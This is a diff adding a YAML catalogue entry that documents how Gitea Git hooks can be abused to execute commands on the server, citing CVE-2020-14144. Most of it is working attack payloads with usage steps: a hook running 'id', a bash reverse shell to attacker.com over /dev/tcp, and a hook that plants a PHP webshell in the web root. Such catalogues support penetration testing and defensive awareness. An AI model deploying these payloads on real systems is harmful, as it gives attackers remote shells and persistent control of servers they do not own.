@@ -1,0 +1,56 @@
+---
+comment: "Gitea is a self-hosted Git service. Administrators and users with the \"\
+  May create\nGit hooks\" permission can attach pre-receive, update, or post-receive\
+  \ shell scripts\nto any repository. These hooks execute on the Gitea server process\
+  \ on every push,\nproviding OS command execution with the git server user's privileges.\n\
+  \nCVE-2020-14144 documents this behavior for Gitea 1.1.0-1.12.5. Starting from\n\
+  version 1.13, DISABLE_GIT_HOOKS defaults to true, preventing hook creation unless\n\
+  explicitly re-enabled by a site administrator. Earlier versions and installations\n\
+  that re-enable hooks remain fully exploitable by any user with hook privileges.\n\
+  \nGit hook execution is inherent to Git server functionality, not a vulnerability\n\
+  per se \u2014 the vendor considers it expected behavior for privileged users.\n"
+functions:
+  rce:
+  - code: |
+      #!/bin/bash
+      id
+    comment: "Navigate to any repository you own or administer:\nRepository \u2192\
+      \ Settings \u2192 Git Hooks \u2192 post-receive\n\nPaste the hook script above\
+      \ and click \"Update Hook\". Trigger execution by\npushing a commit to the repository:\n\
+      \n  git push origin main\n\nThe hook runs as the Gitea process user (commonly\
+      \ git or gitea). Output from\npost-receive hooks is visible in the git push\
+      \ terminal output on the client.\nUse pre-receive or update hooks to capture\
+      \ output before git processes the push.\n\nRequires the \"Enable Git Hooks\"\
+      \ user setting to be active. A site admin can\ngrant it at: Site Administration\
+      \ \u2192 Users \u2192 Edit \u2192 May create Git hooks.\n"
+    contexts:
+      admin:
+      authenticated:
+  reverse-shell:
+  - blind: true
+    code: |
+      #!/bin/bash
+      bash -i >& /dev/tcp/attacker.com/12345 0>&1 &
+    comment: "Set this script as the post-receive hook (Repository \u2192 Settings\
+      \ \u2192 Git Hooks \u2192\npost-receive). Trigger by pushing any commit to the\
+      \ repository. The trailing &\nprevents the git client from hanging while the\
+      \ shell session is active.\nThe shell runs as the Gitea process user (commonly\
+      \ git or gitea).\n"
+    contexts:
+      admin:
+      authenticated:
+    listener: tcp-server
+    tty: false
+  webshell:
+  - code: |
+      #!/bin/bash
+      echo '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>' > /var/www/html/shell.php
+    comment: |
+      If Gitea shares a host with a PHP web server (common on shared or self-hosted
+      setups), this post-receive hook writes a PHP webshell to the webroot.
+      Adjust the target path to match the web server document root.
+      Access the webshell at: http://victim.com/shell.php?c=id
+    contexts:
+      admin:
+      authenticated:
+...
